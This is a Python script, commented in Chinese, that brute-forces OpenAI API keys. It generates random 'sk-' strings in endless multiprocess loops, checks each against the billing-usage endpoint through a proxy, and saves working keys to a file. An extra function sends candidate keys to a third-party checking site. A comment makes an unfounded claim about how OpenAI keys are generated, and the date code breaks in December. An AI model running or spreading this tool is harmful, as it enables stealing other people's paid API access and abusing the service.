import hashlib
import multiprocessing
import time
import requests
import string
import random
import requests
import datetime

import os
os.environ["http_proxy"] = "http://127.0.0.1:7890"
os.environ["https_proxy"] = "http://127.0.0.1:7890"
os.environ["all_proxy"] = "socks5://127.0.0.1:7890"



def fetch_usage(key):
    OPENAI_API_KEY = key

    API_BASE_URL = 'https://api.openai.com'

    start_date, end_date = format_date()

    url_usage = f"{API_BASE_URL}/v1/dashboard/billing/usage?start_date={start_date}&end_date={end_date}"

    headers = {
        'Authorization': f"Bearer {OPENAI_API_KEY}",
        'Content-Type': 'application/json',
    }

    try:
        use_response = requests.get(url_usage, headers=headers)

        with open("fetch_log.txt", "a") as fetch_log:
          fetch_log.write(key + ': ' + str(use_response)  + "\n")

        if not use_response.ok:
            return None

        usage_data = use_response.json()
        
        usage = round(usage_data['total_usage']) / 100
        return usage or 0
    except Exception as e:
        return None


def format_date():
    today = datetime.date.today()
    year = today.year
    month = today.month
    last_day = datetime.date(year, month + 1, 1) - datetime.timedelta(1)
    formatted_first_day = f"{year}-{str(month).zfill(2)}-01"
    formatted_last_day = f"{year}-{str(month).zfill(2)}-{str(last_day.day).zfill(2)}"
    return [formatted_first_day, formatted_last_day]


def generate_key():
  # Openai官方文档指出 根据SHA-256散列函数生成随机字符串
  key_sk_star = "sk-"	
  key_random_sk = ''.join(random.choices(string.ascii_letters + string.digits, k=48)) # 48为长度，官方的密钥长度
  key_sk_end = key_random_sk	
  return key_sk_star + key_sk_end

def validate_key(key):
  url = f"https://v1.apigpt.cn/key/?key={key}"
  headers = {"Content-Type": "application/json"}	
  response = requests.get(url, headers=headers)
  if response.status_code != 200:
      return None
  data = response.json()
  return data.get("total_granted", None)

def write_strings_to_file(filename, num_strings):
  
  # 写入文件操作
  
  with open(filename, "a") as f:
  
    for i in range(num_strings):
    
      key = generate_key()
      total_granted = fetch_usage(key)
      if total_granted is None:
        # 写入错误密钥
        with open("error-key.txt", "a") as f_error:
          f_error.write(key + "\n")
      else:
      
      # 写入正确密钥
      
        with open("ok-key.txt", "a") as f_ok:
        
          f_ok.write(key + "\n")
      # 写入日志
      with open("log.txt", "a") as f_log: 
        f_log.write(f"Key: {key}, 检测结果: {total_granted}\n")

      time.sleep(2)

if __name__ == '__main__':

  filename = 'all.txt'
  
  num_strings = 1000

  # 循环执行生成和写入
  
  while True:
    # 创建多进程池，指定进程数量为CPU核心数的两倍
    pool = multiprocessing.Pool(multiprocessing.cpu_count() * 2)
    # 在进程池中并行执行生成和写入
    for i in range(multiprocessing.cpu_count() * 2):
      pool.apply_async(write_strings_to_file, args=(filename, num_strings))
    # 关闭进程池
    
    pool.close()
    
    pool.join()
